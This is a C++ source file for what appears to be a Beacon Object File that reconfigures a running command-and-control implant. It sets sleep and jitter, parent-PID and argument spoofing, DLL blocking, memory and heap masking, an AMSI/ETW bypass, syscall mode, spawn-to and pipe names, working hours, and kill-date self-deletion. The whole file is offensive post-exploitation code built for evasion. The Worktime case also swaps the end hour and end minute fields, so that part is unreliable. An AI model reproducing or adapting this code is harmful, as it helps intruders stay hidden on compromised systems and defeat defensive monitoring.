#include <general.h>

enum class Config {
    Jitter = 14,
    Sleep,
    Mask,
    Ppid,
    BlockDlls,
    Arg,
    Spawn,
    Killdate,
    Worktime,
    HeapObf,
    KilldateSelfdel,
    KilldateExit,
    AmsiEtwBypass,
    Syscall,
    ForkPipeName,
    Argue,
    BofApiProxy
};

enum class Mask {
    Timer = 1,
    Pooling,
    None
};

extern "C" auto go( char* args, int argc ) -> void {
    datap data_parser = { 0 };

    BeaconDataParse( &data_parser, args, argc );

    BEACON_INFO* info = (BEACON_INFO*)malloc( sizeof( BEACON_INFO ) );

    BeaconInformation( info );

    Config config_id = (Config)BeaconDataInt( &data_parser );

    switch ( config_id ) {
        case Config::Ppid: {
            ULONG ParentID = BeaconDataInt( &data_parser );
            info->Config->Ps.ParentID = ParentID;
            
            break;
        }
        case Config::Sleep: {
            ULONG NewSleep = BeaconDataInt( &data_parser );
            info->Config->SleepTime = NewSleep * 1000;
            
            break;
        }
        case Config::Jitter: {
            ULONG NewJitter = BeaconDataInt( &data_parser );
            info->Config->Jitter = NewJitter;
            
            break;
        }
        case Config::BlockDlls: {
            BOOL BlockDlls  = BeaconDataInt( &data_parser );
            info->Config->Ps.BlockDlls = BlockDlls;
            
            break;
        }
        case Config::Mask: {
            Mask TechniqueID = (Mask)BeaconDataInt( &data_parser );
            if ( 
                TechniqueID != Mask::Timer &&
                TechniqueID != Mask::None 
            ) {
                break;
            }
        
            info->Config->Mask.Beacon = (INT32)TechniqueID;
        
            break;
        }
        case Config::HeapObf: {
            BOOL HeapObf = BeaconDataInt( &data_parser );

            info->Config->Mask.Heap = HeapObf;

            break;
        }
        case Config::Spawn: {
            WCHAR* Spawnto = (WCHAR*)BeaconDataExtract( &data_parser, 0 );
            
            info->Config->Postex.Spawnto = Spawnto;

            break;
        }
        case Config::Killdate: {
            SYSTEMTIME LocalTime { 0 };

            INT16 Year  = (INT16)BeaconDataInt( &data_parser );
            INT16 Month = (INT16)BeaconDataInt( &data_parser );
            INT16 Day   = (INT16)BeaconDataInt( &data_parser );

            info->Config->KillDate.Day   = Day;
            info->Config->KillDate.Month = Month;
            info->Config->KillDate.Year  = Year;

            if ( ! Day && ! Month && ! Year ) { 
                info->Config->KillDate.Enabled = FALSE;
            } else {
                info->Config->KillDate.Enabled = TRUE;
            }

            break;
        }
        case Config::KilldateExit: {
            BOOL KdExitProc = BeaconDataInt( &data_parser );
            
            info->Config->KillDate.ExitProc = KdExitProc;

            break;
        }
        case Config::KilldateSelfdel: {
            BOOL KdSelfdel = BeaconDataInt( &data_parser );

            info->Config->KillDate.SelfDelete = KdSelfdel;

            break;
        }
        case Config::AmsiEtwBypass: {
            ULONG AmsiEtwBypass = BeaconDataInt( &data_parser );

            info->Config->AmsiEtwBypass = AmsiEtwBypass;

            break;
        }
        case Config::Worktime: {
            INT16 HrStart = (INT16)BeaconDataInt( &data_parser );
            INT16 MnStart = (INT16)BeaconDataInt( &data_parser );
            INT16 HrEnd   = (INT16)BeaconDataInt( &data_parser );
            INT16 MnEnd   = (INT16)BeaconDataInt( &data_parser );

            info->Config->Worktime.StartHour = HrStart;
            info->Config->Worktime.StartMin  = MnStart;
            info->Config->Worktime.EndMin    = HrEnd;
            info->Config->Worktime.EndHour   = MnEnd;

            if ( ! HrStart && ! MnStart && ! HrEnd && ! MnEnd ) {
                info->Config->Worktime.Enabled = FALSE;
            } else {
                info->Config->Worktime.Enabled = TRUE;
            }

            break;
        }
        case Config::Syscall: {
            INT32 Syscall = BeaconDataInt( &data_parser );

            info->Config->Syscall = Syscall;

            break;
        }
        case Config::ForkPipeName: {
            WCHAR* ForkPipeName = (WCHAR*)BeaconDataExtract( &data_parser, nullptr );

            info->Config->Postex.ForkPipe = ForkPipeName;

            break;
        }
        case Config::BofApiProxy: {
            BOOL BofApiProxy = BeaconDataInt( &data_parser );

            info->Config->BofProxy = BofApiProxy;

            break;
        }
        case Config::Argue: {
            WCHAR* Argue  = (WCHAR*)BeaconDataExtract( &data_parser, nullptr );

            info->Config->Ps.SpoofArg = Argue;

            break;
        }
    }

    free( info );

    BeaconPkgInt32( EXIT_SUCCESS );

    return;
}